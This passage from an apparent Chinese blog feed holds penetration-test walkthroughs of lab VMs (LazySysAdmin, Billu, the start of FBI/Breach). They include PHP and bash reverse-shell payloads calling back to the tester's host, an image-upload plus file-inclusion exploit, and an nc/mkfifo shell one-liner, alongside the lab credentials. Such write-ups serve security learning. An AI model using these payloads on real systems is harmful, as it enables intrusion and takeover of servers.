class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$shell</span><span class="token operator">=</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$message</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`$shell`</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>然后nc监听一下，激活主题并且访问一个不存在的帖子</p></li><li><p><code>http://192.168.0.110/wordpress/?p=-1</code></p></li><li><p>nc就弹回一个 <code>www-dada</code> 的shell</p></li><li><p>然后我们查看 <code>/etc/passwd</code>文件发现</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>哈？这不就是之前说的那个可能的用户名嘛</p></li><li><p>然后服务器默认的密码 <code>12345</code>，那我们试试ssh能不能给他连上了</p></li><li><p>kali输入命令 ： <code>ssh togie@192.168.0.110</code>给我来一一段这样的话？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#############################################################################</span><span class="token comment">#              Welcome to Web_TR1                                  #</span><span class="token comment">#            All connections are monitored and recorded                     #    </span><span class="token comment">#          Disconnect IMMEDIATELY if you are not an authorized user!        #     </span><span class="token comment">#############################################################################</span>togie@192.168.0.110's password:<span class="token number">1</span>. 欢迎使用Web目录1<span class="token number">2</span>. 所有连接都被监视和记录<span class="token number">3</span>. 如果您不是授权用户，请立即断开连接！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>吓我呢？</p></li><li><p>试试密码，进去了</p></li><li><p><code>ls -al ~/</code></p></li><li><p>发现没啥</p></li><li><p><code>crontab -l</code></p></li><li><p>也没啥</p></li><li><p><code>history</code></p></li><li><p>也没啥~</p></li><li><p><code>sudo -l</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">User togie may run the following commands on LazySysAdmin:    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL用户togie可以在lazysadmin上运行以下命令：（全部：全部）全部<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>直接就是root权限了</p></li><li><p>root用户下看到一个 <code>proof.txt</code></p></li><li><p>内容是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WX6k7NJtA8gfk*w5J3<span class="token operator">&amp;</span>T@*Ga6<span class="token operator">!</span>0o5UP89hMVEQ<span class="token comment">#PT9851</span>Well <span class="token keyword">done</span> <span class="token builtin class-name">:</span><span class="token punctuation">)</span>Hope you learn't a few things along the way.Regards,Togie McdogieEnjoy some random stringsWX6k7NJtA8gfk*w5J3<span class="token operator">&amp;</span>T@*Ga6<span class="token operator">!</span>0o5UP89hMVEQ<span class="token comment">#PT9851</span>2d2v<span class="token comment">#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span>pf%<span class="token operator">&amp;</span>1nRpaj^68ZeV2St9GkdoDkj48Fl<span class="token variable">$MI97Zt2nebt02</span>bhO<span class="token operator">!</span>5Je65B6Z0bhZhQ3W64wL65wonnQ<span class="token variable">$@</span>yw%Zhy0U19pu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. phpmyadmin地址</span>http://192.168.0.110/phpmyadmin/<span class="token comment"># 2. wordpress管理后台</span>http://192.168.0.110/wordpress/wp-admin<span class="token comment"># 3. mysql账号密码：</span>Admin ：TogieMYSQL12345^^ （也是wordpress管理后台的账号密码）<span class="token comment"># 4. ssh账号密码：</span>togie ：12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“抓住阿三”靶机渗透</title>
      <link href="/india/"/>
      <url>/india/</url>
      
        <content type="html"><![CDATA[<h1 id="“抓住阿三”靶机渗透"><a href="#“抓住阿三”靶机渗透" class="headerlink" title="“抓住阿三”靶机渗透"></a>“抓住阿三”靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1.渗透过程"></a>1.渗透过程</h2><ul><li><p>扫描局域网<code>apr-scan  --interface=eth0 192.168.0.1/24</code></p></li><li><p>找到IP地址<code>192.168.0.104</code></p></li><li><p>找ip开放的端口<code> nmap -v -A -oN /tmp/india.txt 192.168.0.104</code></p></li><li><p>扫描结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Nmap 7.70 scan initiated Sun Apr 19 14:38:31 2020 as: nmap -v -A -oN /tmp/122.txt 192.168.0.104</span>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.104Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00043s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">998</span> closed portsPORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">5</span>.9p1 Debian 5ubuntu1.4 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey: <span class="token operator">|</span>   <span class="token number">1024</span> fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">88</span>:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span><span class="token operator">|</span> http-cookie-flags: <span class="token operator">|</span>   /: <span class="token operator">|</span>     PHPSESSID: <span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span><span class="token operator">|</span> http-methods: <span class="token operator">|</span>_  Supported Methods: GET HEAD POST OPTIONS<span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: --<span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">[</span>IndiShell Lab<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">==</span>--MAC Address: 00:0C:29:A1:E2:DF <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Uptime guess: <span class="token number">0.002</span> days <span class="token punctuation">(</span>since Sun Apr <span class="token number">19</span> <span class="token number">14</span>:35:37 <span class="token number">2020</span><span class="token punctuation">)</span>Network Distance: <span class="token number">1</span> hopTCP Sequence Prediction: <span class="token assign-left variable">Difficulty</span><span class="token operator">=</span><span class="token number">263</span> <span class="token punctuation">(</span>Good luck<span class="token operator">!</span><span class="token punctuation">)</span>IP ID Sequence Generation: All zerosService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">0.43</span> ms <span class="token number">192.168</span>.0.104Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span><span class="token comment"># Nmap done at Sun Apr 19 14:38:40 2020 -- 1 IP address (1 host up) scanned in 9.01 seconds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>发现只有开放了两个端口：<code>22和80</code></p></li><li><p>去看看web:</p></li><li><p>发现只有一个登录框</p></li><li><p>先试试sql注入：</p></li><li><p>使用sqlmap：<code>sqlmap -u 192.168.0.104 --data=&quot;un=123&amp;ps=123&amp;login=let%27s+login&quot; --level=3</code></p></li><li><p>结果:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">all tested parameters <span class="token keyword">do</span> not appear to be injectable. Try to increase values <span class="token keyword">for</span> <span class="token string">'--level'</span>/<span class="token string">'--risk'</span> options <span class="token keyword">if</span> you wish to perform <span class="token function">more</span> tests. If you suspect that there is some kind of protection mechanism involved <span class="token punctuation">(</span>e.g. WAF<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>sql注入没有了</p></li><li><p>开始爆破目录：</p></li><li><p>输入一个没有文件的链接发现是<code>Apache/2.2.22 (Ubuntu)</code>的服务器，那么很有可能是php的代码</p></li><li><p>爆破php的路径</p></li><li><p>使用工具：Buster<code>Buster.exe -u=http://192.168.0.104/ -d=php.txt -t=5</code></p></li><li><p>扫描结果（除去了状态码为400的）:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///add.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///index.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///head.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///show.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///test.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///c</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///index</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///panel</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///c.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///in.php</span><span class="token number">200</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///panel.php</span><span class="token number">302</span> <span class="token constant">OK</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///phpmy</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///cgi-bin/</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo3.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo5.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/database_demo.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo4.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo7.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo8.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/hello_world_demo.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo6.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/fix_depricated.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/reports/index.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/demo/demo9.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/rpm-build/header.inc.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/rpm-build/checkout-build-archives.php</span><span class="token number">403</span> Forbidden<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>http<span class="token punctuation">:</span><span class="token comment">//192.168.0.104///doc/rpm-build/post_install.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li>逐个查看网页：发现一个test.php有这样一句话:<code>&#39;file&#39; parameter is empty. Please provide file path in &#39;file&#39; parameter </code></li><li>说是缺少一个file参数，那随便试用一个文件<code>http://192.168.0.104///test.php?file=./test.php</code></li><li>发现没反应，那就试试post请求:</li><li>发现把自己下载下来了~！竟然可以随便下载文件</li><li>那就把刚刚扫描到的那些文件都下载下来</li><li>把phpinfo里面有用的配置文件也下载下来</li><li>发现c.php是数据库连接文件<code>mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></li><li>in.php是<code>phpinfo</code></li><li>找到数据库账号密码了，去找找数据库管理界面，网页是php+mysql的一般的管理工具是<code>phpmyadmin</code></li><li>前面扫描到<code>http://192.168.0.104/phpmy</code>是<code>phpmyadmin</code></li><li>PHPMyadmin配置文件是<code>config.inc.php</code>或<code>config.default.php</code></li><li>去把他的配置文件下载下来看看</li><li>发现了:<code>$cfg[&#39;Servers&#39;][$i][&#39;user&#39;] = &#39;root&#39;; $cfg[&#39;Servers&#39;][$i][&#39;password&#39;] = &#39;roottoor&#39;;</code></li></ul><ul><li><p>登录之后发现转到了<code>http://192.168.0.104/panel.php</code></p></li><li><p>看看下载下来的panel.php</p></li><li><p>panel.php是一个操作用户的界面</p></li><li><p>查看代码</p></li><li><p>发现了一个文件包含漏洞</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'continue'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$choice</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>当<code>$choice!=&#39;add&#39; &amp;&amp; $choice!=&#39;show&#39;</code>的时候会包含传递的load文件（$choice）</p></li><li><p>我们先添加一个用户他可以上传头像的，阅读代码发现对只能上传图片，所以我们用图片马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$ip</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$port</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -i >&amp; /dev/tcp/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$port</span><span class="token punctuation">&#125;</span></span> 0>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>反弹shell 带ip和port的参数</p></li><li><p>利用漏洞</p></li><li><p>找到图片码的位置<code>http://192.168.0.104/uploaded_images/shell.png</code></p></li><li><p>抓包改提交的参数</p></li><li><p><code>load=uploaded_images/shell.png&amp;continue=continue&amp;ip=192.168.0.108&amp;port=1111</code></p></li><li><p>nc接受：<code>nc -lvp 1111</code></p></li><li><p>发现没反应</p></li><li><p>可能是包含之后提交的参数已经过了</p></li><li><p>换一个固定IP地址和端口的图片码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     @<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -i >&amp; /dev/tcp/192.168.0.108/6666 0>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>nc接受：<code>nc -lvp 6666</code></p></li><li><p>然后用的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span><span class="token operator">=</span><span class="token string single-quoted-string">'192.168.0.108'</span><span class="token punctuation">;</span><span class="token variable">$port</span><span class="token operator">=</span><span class="token string single-quoted-string">'2520'</span><span class="token punctuation">;</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$errno</span><span class="token punctuation">,</span><span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\nconnect success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$shell</span><span class="token operator">=</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$message</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`$shell`</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>反弹了一个<code>www-data</code>的shell</p></li><li><p>而且这个shell几乎没有权限只能操作网站目录</p></li><li><p>只有uploaded_images目录可以写入文件</p></li><li><p>写了一个一句话木马就上传就开用菜刀连了</p></li><li><p>发现版本是<code>Ubuntu12.04</code>有一个<code>CVE-2015-1328</code></p></li><li><p>然后还是没办法拿提权</p></li><li><p>菜刀的终端没办法执行exp（提权的程序）</p></li><li><p>最后使用菜刀的终端去反弹了一个shell</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkfifo</span> /tmp/lcawx<span class="token punctuation">;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.0.108 <span class="token number">4444</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/tmp/lcawx <span class="token operator">|</span> /bin/sh <span class="token operator">></span>/tmp/lcawx <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/lcawx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>然后在反弹的shell里面执行了exp</li><li>成功拿下rootshell</li></ul><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><h4 id="a-数据库账号密码"><a href="#a-数据库账号密码" class="headerlink" title="a.数据库账号密码"></a>a.数据库账号密码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user:billu passwd:b0x_billu dbname:ica_labuser:root passwd:roottoor <span class="token punctuation">(</span>root密码<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="b-网页登录密码"><a href="#b-网页登录密码" class="headerlink" title="b.网页登录密码"></a>b.网页登录密码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user:biLLu passwd:hEx_it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“FBI”靶机渗透</title>
      <link href="/fbi/"/>
      <url>/fbi/</url>
      
        <content type="html"><![CDATA[<h1 id="FBI靶机渗透"><a href="#FBI靶机渗透" class="headerlink" title="FBI靶机渗透"></a>FBI靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>给出了IP地址为固定的<code>192.168.110.140</code></p></li><li><p>而我当前上网的ip为:<code>192.168.0.101</code></p></li><li><p>这里给配置电脑两个IP地址</p></li><li><p>先配置一个静态然后点高级添加一个IP地址就可以了</p></li><li><p>下面开始收集信息</p></li><li><p>用nmap扫描端口 <code>nmap -v -A -oN /tmp/fbi.txt</code></p></li><li><p>扫描结果发现开启了1000个端口996个服务</p></li><li><p>显然这不正常</p></li><li><p>那我们直接去看看web: <code>http://192.168.110.140</code></p></li><li><p>主页的文字翻译：</p></li></ul><blockquote><p>Initech被攻破，董事会投票决定聘请其内部的Initech网络咨询有限责任合伙公司分部提供协助。鉴于此次违约事件的高调性和近乎灾难性的损失，随后针对该公司的尝试也很多。Initech指派了由Bill Lumbergh、CISSP和Peter Gibbons，C | EH，SEC+，NET+，A+领导的顶级顾问来控制和分析漏洞。<br>该公司几乎没有意识到，这一漏洞不是熟练的黑客所为，而是一位心怀不满的前员工在离开时送给他的离别礼物。顶级顾问一直在努力控制漏洞。然而，他们自己的职业道德和留下的烂摊子可能是公司的垮台。</p></blockquote><ul><li><p>好像没啥用….</p></li><li><p>F12看到这么一串东西看起来很像base64</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----></span><span aria-hidden="true" 